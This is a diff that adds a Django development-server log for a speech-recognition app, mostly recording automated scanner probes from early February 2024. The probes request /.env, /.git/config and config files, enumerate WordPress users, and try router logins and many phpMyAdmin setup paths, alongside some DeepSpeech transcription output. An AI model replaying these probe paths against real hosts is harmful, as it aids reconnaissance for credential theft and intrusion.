+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:04] "GET /?rest_route=/wp/v2/users/ HTTP/1.0" 400 65965
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /.git/config
+[05/Feb/2024 20:58:05] "GET /.git/config HTTP/1.0" 400 65612
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /s/4373e2738313e27363e2237313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+[05/Feb/2024 20:58:05] "GET /s/4373e2738313e27363e2237313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.0" 400 66579
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /config.json
+[05/Feb/2024 20:58:05] "GET /config.json HTTP/1.0" 400 65610
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /telescope/requests
+[05/Feb/2024 20:58:05] "GET /telescope/requests HTTP/1.0" 400 65687
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 20:58:06] "GET /?rest_route=/wp/v2/users/ HTTP/1.0" 400 65969
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 21:25:31] "GET / HTTP/1.0" 400 65751
+Not Found: /boaform/admin/formLogin
+[05/Feb/2024 21:39:26] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 21:42:35] "GET / HTTP/1.0" 400 66775
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 21:45:12] "GET / HTTP/1.0" 400 66915
+Not Found: /boaform/admin/formLogin
+[05/Feb/2024 21:54:04] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Not Found: /
+[05/Feb/2024 22:07:17] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 22:07:20] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[05/Feb/2024 22:08:54] "GET / HTTP/1.0" 400 65751
+Not Found: /
+[05/Feb/2024 22:21:26] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 22:21:30] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[05/Feb/2024 22:33:11] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[05/Feb/2024 23:59:22] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 00:22:33] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 00:39:38] "GET / HTTP/1.0" 404 2170
+Not Found: /boaform/admin/formLogin
+[06/Feb/2024 01:19:46] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Not Found: /
+[06/Feb/2024 01:43:48] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('184.105.247.196', 14928)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[06/Feb/2024 01:44:09] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('184.105.247.196', 8760)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /favicon.ico
+[06/Feb/2024 01:44:17] "GET /favicon.ico HTTP/1.1" 404 2223
+----------------------------------------
+Exception happened during processing of request from ('184.105.247.196', 38076)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[06/Feb/2024 01:55:55] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 01:56:47] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 01:56:47] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 02:23:29] "GET / HTTP/1.0" 404 2167
+Not Found: /.env
+[06/Feb/2024 02:43:53] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[06/Feb/2024 02:43:55] "POST / HTTP/1.0" 404 2168
+Not Found: /druid/index.html
+[06/Feb/2024 02:44:17] "GET /druid/index.html HTTP/1.0" 404 2233
+Not Found: /
+[06/Feb/2024 02:48:02] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 02:49:40] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 04:03:49] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 04:09:39] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 04:09:43] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /2myD
+[06/Feb/2024 04:30:26] "GET /2myD HTTP/1.0" 400 65049
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /9jPj
+[06/Feb/2024 04:30:27] "GET /9jPj HTTP/1.0" 400 65049
+Not Found: /
+[06/Feb/2024 04:44:08] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 04:55:31] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 04:57:50] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 05:34:40] "GET / HTTP/1.0" 404 2170
+[06/Feb/2024 05:53:09] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+Not Found: /
+[06/Feb/2024 05:53:13] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 05:54:16] "GET / HTTP/1.0" 404 2167
+Not Found: /webui/
+[06/Feb/2024 05:54:28] "GET /webui/ HTTP/1.0" 404 2203
+Not Found: /
+[06/Feb/2024 05:54:41] "GET / HTTP/1.0" 404 2167
+Not Found: /geoserver/web/
+[06/Feb/2024 05:56:23] "GET /geoserver/web/ HTTP/1.0" 404 2227
+Not Found: /
+[06/Feb/2024 06:06:26] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 06:06:29] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 06:16:36] "GET / HTTP/1.0" 400 64578
+Not Found: /
+[06/Feb/2024 06:18:56] "HEAD / HTTP/1.0" 404 2168
+Not Found: /nmaplowercheck1707200336
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+[06/Feb/2024 06:18:56] "GET /nmaplowercheck1707200336 HTTP/1.0" 404 2257
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Not Found: /sdk
+[06/Feb/2024 06:18:56] "POST /sdk HTTP/1.0" 404 2195
+Bad Request: /
+[06/Feb/2024 06:18:56] "GET / HTTP/1.0" 400 64578
+Bad Request: /
+[06/Feb/2024 06:18:56] "GET / HTTP/1.0" 400 64578
+Not Found: /HNAP1
+[06/Feb/2024 06:18:56] "GET /HNAP1 HTTP/1.0" 404 2200
+Not Found: /evox/about
+[06/Feb/2024 06:18:56] "GET /evox/about HTTP/1.0" 404 2215
+Not Found: /
+[06/Feb/2024 06:18:56] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 06:18:56] "GET / HTTP/1.0" 400 64578
+Not Found: /
+[06/Feb/2024 06:18:56] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 06:26:41] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 06:38:16] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 06:42:39] "GET / HTTP/1.0" 400 64578
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Not Found: /sdk
+Bad Request: /
+Not Found: /nmaplowercheck1707201759
+[06/Feb/2024 06:42:39] "POST /sdk HTTP/1.0" 404 2195
+[06/Feb/2024 06:42:39] "GET / HTTP/1.0" 400 64578
+[06/Feb/2024 06:42:39] "GET /nmaplowercheck1707201759 HTTP/1.0" 404 2257
+Not Found: /evox/about
+[06/Feb/2024 06:42:39] "GET /evox/about HTTP/1.0" 404 2215
+Not Found: /HNAP1
+[06/Feb/2024 06:42:39] "GET /HNAP1 HTTP/1.0" 404 2200
+Not Found: /rom-0
+[06/Feb/2024 06:42:39] "GET /rom-0 HTTP/1.0" 404 2200
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 06:42:39] "GET / HTTP/1.0" 400 64578
+Not Found: /
+[06/Feb/2024 06:42:39] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 07:03:28] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 07:28:47] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('107.170.229.45', 42878)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 09:02:14] "GET / HTTP/1.0" 400 65857
+Bad Request: /
+[06/Feb/2024 09:02:14] "GET / HTTP/1.0" 400 65855
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /Public/home/js/check.js
+[06/Feb/2024 09:02:16] "GET /Public/home/js/check.js HTTP/1.0" 400 66106
+Bad Request: /Public/home/js/check.js
+[06/Feb/2024 09:02:16] "GET /Public/home/js/check.js HTTP/1.0" 400 66108
+Not Found: /
+[06/Feb/2024 10:18:01] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 10:34:31] "GET / HTTP/1.0" 404 2170
+[06/Feb/2024 11:15:50] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+[06/Feb/2024 11:16:05] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 29
+Not Found: /
+[06/Feb/2024 12:31:00] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 12:44:53] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 12:47:06] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 13:05:00] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 13:05:03] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 13:19:28] "GET / HTTP/1.0" 404 2170
+Not Found: /Pages/log/
+[06/Feb/2024 13:23:53] "GET /Pages/log/ HTTP/1.0" 404 2215
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 13:55:14] "GET / HTTP/1.0" 400 65861
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 13:55:15] "GET / HTTP/1.0" 400 65861
+Not Found: /
+[06/Feb/2024 14:20:53] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 14:49:03] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 2200
+Not Found: /
+[06/Feb/2024 15:27:56] "GET / HTTP/1.0" 404 2167
+Not Found: /.git/config
+[06/Feb/2024 15:27:56] "GET /.git/config HTTP/1.0" 404 2218
+Not Found: /server-status
+[06/Feb/2024 15:27:56] "GET /server-status HTTP/1.0" 404 2224
+Not Found: /config.json
+[06/Feb/2024 15:27:56] "GET /config.json HTTP/1.0" 404 2218
+Not Found: /.env
+[06/Feb/2024 15:27:56] "GET /.env HTTP/1.0" 404 2197
+Not Found: /telescope/requests
+[06/Feb/2024 15:27:56] "GET /telescope/requests HTTP/1.0" 404 2239
+Not Found: /info.php
+[06/Feb/2024 15:27:57] "GET /info.php HTTP/1.0" 404 2209
+Not Found: /.env
+[06/Feb/2024 15:46:22] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[06/Feb/2024 15:46:23] "POST / HTTP/1.0" 404 2168
+Not Found: /
+[06/Feb/2024 15:52:54] "GET / HTTP/1.0" 404 2167
+Not Found: /.env
+[06/Feb/2024 15:58:49] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[06/Feb/2024 16:13:50] "GET / HTTP/1.0" 404 2167
+/var/www/ai_speech/stt_app/views.py changed, reloading.
+
+Okunan: dans personnaliser
+
+35.62
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmplierkf6e.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmplierkf6e.wav']
+Okunan: dans mon malaisienne
+
+34.67
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmprjn9r31k.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmprjn9r31k.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmpcohpk79q.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmpcohpk79q.wav']
+Okunan: 
+
+0.0
+seçilen dil: fr
+Ses dosyası okundu
+Dosya Başarıyla Kaydedildi: /tmp/tmp3mmeddvx.wav
+['deepspeech', '--model', '../dsmodel/deepspeech-french-scorer/output_graph_fr.pbmm', '--scorer', '../dsmodel/deepspeech-french-scorer/kenlm_fr.scorer', '--audio', '/tmp/tmp3mmeddvx.wav']
+Okunan: 
+
+0.0
+/var/www/ai_speech/venv/lib/python3.7/site-packages/pydub/utils.py:170: RuntimeWarning: Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work
+  warn("Couldn't find ffmpeg or avconv - defaulting to ffmpeg, but may not work", RuntimeWarning)
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+stt_app.voice: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the SttAppConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+[06/Feb/2024 17:00:35] "GET /stt/test-material HTTP/1.0" 301 0
+[06/Feb/2024 17:00:36] "GET /stt/test-material/ HTTP/1.0" 200 13387
+Not Found: /stt/
+[06/Feb/2024 17:00:48] "GET /stt/ HTTP/1.0" 404 3072
+[06/Feb/2024 17:00:55] "GET /stt/test-material/ HTTP/1.0" 200 13387
+Not Found: /stt/
+[06/Feb/2024 17:01:45] "GET /stt/ HTTP/1.0" 404 3072
+[06/Feb/2024 17:01:48] "GET /stt/test-material/ HTTP/1.0" 200 13387
+[06/Feb/2024 17:01:59] "GET /stt/test-mic-speech/ HTTP/1.0" 200 1415
+[06/Feb/2024 17:03:09] "POST /stt/api/speech-recognition/ HTTP/1.0" 200 87
+Not Found: /
+[06/Feb/2024 17:05:37] "GET / HTTP/1.0" 404 2170
+Not Found: /actuator/gateway/routes
+[06/Feb/2024 17:22:02] "GET /actuator/gateway/routes HTTP/1.0" 404 2257
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 17:25:42] "GET / HTTP/1.0" 400 66087
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 17:28:50] "GET / HTTP/1.0" 400 65937
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 19:11:50] "GET / HTTP/1.0" 400 65939
+Not Found: /
+[06/Feb/2024 19:13:57] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 19:50:06] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 19:50:10] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 19:50:16] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 19:50:19] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 20:22:58] "GET / HTTP/1.0" 400 65935
+Not Found: /
+[06/Feb/2024 20:38:58] "GET / HTTP/1.0" 404 2167
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /wp-admin/setup-config.php
+[06/Feb/2024 21:01:31] "GET /wp-admin/setup-config.php?step=1 HTTP/1.0" 400 66637
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /wordpress/wp-admin/setup-config.php
+[06/Feb/2024 21:01:32] "GET /wordpress/wp-admin/setup-config.php?step=1 HTTP/1.0" 400 66745
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /wp-admin/install.php
+[06/Feb/2024 21:01:33] "GET /wp-admin/install.php?step=1 HTTP/1.0" 400 66582
+Not Found: /zabbix/favicon.ico
+[06/Feb/2024 21:07:38] "GET /zabbix/favicon.ico HTTP/1.0" 404 2239
+Not Found: /
+[06/Feb/2024 22:07:54] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 22:14:48] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 22:50:39] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[06/Feb/2024 22:50:43] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 22:52:41] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[06/Feb/2024 22:52:49] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 23:09:50] "GET / HTTP/1.0" 400 65469
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[06/Feb/2024 23:28:28] "GET / HTTP/1.0" 400 65933
+Not Found: /
+[07/Feb/2024 00:20:58] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 00:20:59] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 01:05:03] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 01:11:51] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 01:11:54] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[07/Feb/2024 01:15:02] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 01:40:07] "GET / HTTP/1.0" 400 65957
+Not Found: /
+[07/Feb/2024 01:47:31] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 03:35:29] "GET / HTTP/1.0" 404 2170
+[07/Feb/2024 05:07:04] "GET /admin/config.php HTTP/1.0" 302 0
+Not Found: /index.htm
+[07/Feb/2024 05:08:19] "POST /index.htm HTTP/1.0" 404 2213
+Not Found: /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7
+[07/Feb/2024 05:08:19] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.0" 404 2294
+Not Found: /
+[07/Feb/2024 06:27:45] "GET / HTTP/1.0" 404 2167
+Not Found: /webui/
+[07/Feb/2024 06:28:54] "GET /webui/ HTTP/1.0" 404 2203
+Not Found: /geoserver/web/
+[07/Feb/2024 06:30:51] "GET /geoserver/web/ HTTP/1.0" 404 2227
+Not Found: /boaform/admin/formLogin
+[07/Feb/2024 06:35:57] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[07/Feb/2024 06:52:56] "GET / HTTP/1.0" 400 64859
+Not Found: /
+[07/Feb/2024 07:45:39] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[07/Feb/2024 07:59:19] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin3/scripts/setup.php
+[07/Feb/2024 08:06:44] "GET /phpMyAdmin3/scripts/setup.php HTTP/1.0" 400 64897
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /myadmin/scripts/setup.php
+[07/Feb/2024 08:06:45] "GET /myadmin/scripts/setup.php HTTP/1.0" 400 64853
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /MyAdmin/scripts/setup.php
+[07/Feb/2024 08:06:45] "GET /MyAdmin/scripts/setup.php HTTP/1.0" 400 64853
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /PHPMYADMIN/scripts/setup.php
+[07/Feb/2024 08:06:46] "GET /PHPMYADMIN/scripts/setup.php HTTP/1.0" 400 64886
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /mysqladmin/scripts/setup.php
+[07/Feb/2024 08:06:46] "GET /mysqladmin/scripts/setup.php HTTP/1.0" 400 64886
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /SQL/scripts/setup.php
+[07/Feb/2024 08:06:47] "GET /SQL/scripts/setup.php HTTP/1.0" 400 64809
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.5.5-pl1/scripts/setup.php
+[07/Feb/2024 08:06:47] "GET /phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 400 64996
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.5.5/scripts/setup.php
+[07/Feb/2024 08:06:48] "GET /phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 400 64952
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.5.4/scripts/setup.php
+[07/Feb/2024 08:06:48] "GET /phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 400 64952
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /phpMyAdmin-2.5.7-pl1/scripts/setup.php
